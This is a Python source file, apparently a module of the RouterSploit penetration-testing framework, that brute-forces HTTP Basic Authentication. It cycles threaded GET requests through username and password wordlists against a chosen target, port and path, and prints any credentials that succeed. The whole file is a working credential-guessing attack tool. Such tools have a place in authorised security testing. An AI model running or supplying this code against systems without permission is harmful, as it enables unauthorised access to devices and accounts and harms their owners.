import threading
import itertools

from routersploit import (
    exploits,
    wordlists,
    print_status,
    print_error,
    LockedIterator,
    print_success,
    print_table,
    sanitize_url,
    http_request,
    boolify,
    multi,
)


class Exploit(exploits.Exploit):
    """
    Module performs bruteforce attack against HTTP Basic Auth service.
    If valid credentials are found, they are displayed to the user.
    """
    __info__ = {
        'name': 'HTTP Basic Bruteforce',
        'author': [
            'Marcin Bury <marcin.bury[at]reverse-shell.com>'  # routersploit module
        ]
    }

    target = exploits.Option('', 'Target IP address or file with target:port (file://)')
    port = exploits.Option(80, 'Target port')

    threads = exploits.Option(8, 'Numbers of threads')
    usernames = exploits.Option('admin', 'Username or file with usernames (file://)')
    passwords = exploits.Option(wordlists.passwords, 'Password or file with passwords (file://)')
    path = exploits.Option('/', 'URL Path')
    verbosity = exploits.Option('yes', 'Display authentication attempts')

    credentials = []

    def run(self):
        self.credentials = []
        self.attack()

    @multi
    def attack(self):
        url = sanitize_url("{}:{}{}".format(self.target, self.port, self.path))

        response = http_request(method="GET", url=url)
        if response is None:
            return

        if response.status_code != 401:
            print_status("Target is not protected by Basic Auth")
            return

        if self.usernames.startswith('file://'):
            usernames = open(self.usernames[7:], 'r')
        else:
            usernames = [self.usernames]

        if self.passwords.startswith('file://'):
            passwords = open(self.passwords[7:], 'r')
        else:
            passwords = [self.passwords]

        collection = LockedIterator(itertools.product(usernames, passwords))

        self.run_threads(self.threads, self.target_function, collection)

        if len(self.credentials):
            print_success("Credentials found!")
            headers = ("Target", "Port", "Login", "Password")
            print_table(headers, *self.credentials)
        else:
            print_error("Credentials not found")

    def target_function(self, running, data):
        module_verbosity = boolify(self.verbosity)
        name = threading.current_thread().name
        url = sanitize_url("{}:{}{}".format(self.target, self.port, self.path))

        print_status(name, 'process is starting...', verbose=module_verbosity)

        while running.is_set():
            try:
                user, password = data.next()
                user = user.encode('utf-8').strip()
                password = password.encode('utf-8').strip()

                response = http_request(method="GET", url=url, auth=(user, password))

                if response.status_code != 401:
                    running.clear()
                    print_success("Target: {}:{} {}: Authentication Succeed - Username: '{}' Password: '{}'".format(self.target, self.port, name, user, password), verbose=module_verbosity)
                    self.credentials.append((self.target, self.port, user, password))
                else:
                    print_error("Target: {}:{} {}: Authentication Failed - Username: '{}' Password: '{}'".format(self.target, self.port, name, user, password), verbose=module_verbosity)
            except StopIteration:
                break

        print_status(name, 'process is terminated.', verbose=module_verbosity)
